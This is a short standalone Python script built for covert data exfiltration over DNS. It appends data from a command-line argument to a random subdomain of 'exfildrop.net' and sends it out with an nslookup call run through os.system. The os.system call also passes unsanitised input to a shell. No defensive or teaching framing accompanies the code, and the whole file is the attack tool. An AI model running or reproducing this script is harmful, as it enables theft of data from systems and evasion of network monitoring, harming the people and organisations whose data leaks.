
#!/usr/bin/env python3
import random, string, os
from subprocess import call

def generate_domain(base="exfildrop.net"):
    rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{rand}.{base}"

def exfiltrate_dns(data):
    subdomain = generate_domain()
    os.system(f"nslookup {data}.{subdomain}")

if __name__ == "__main__":
    import sys
    exfiltrate_dns(sys.argv[1] if len(sys.argv) > 1 else "defaultpayload")
